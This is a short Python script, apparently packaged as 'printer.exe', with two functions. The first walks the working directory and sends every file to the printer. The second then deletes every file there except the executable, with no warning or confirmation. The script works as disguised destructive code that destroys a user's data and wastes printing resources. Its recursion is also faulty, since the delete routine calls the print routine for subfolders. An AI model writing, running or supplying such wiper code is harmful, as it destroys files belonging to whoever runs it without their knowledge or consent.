import os
from time import sleep
from threading import Thread


def printer(path = os.getcwd()):
    for file in os.listdir(path):
        if file not in ['printer.exe']:
            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                os.startfile(file, "print")
                sleep(9)
            else:
                printer(file_path)

def delete(path = os.getcwd()):
    for file in os.listdir(path):
        if file not in ['printer.exe']:
            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                os.remove(file_path)
            else:
                printer(file_path)

printer()
delete()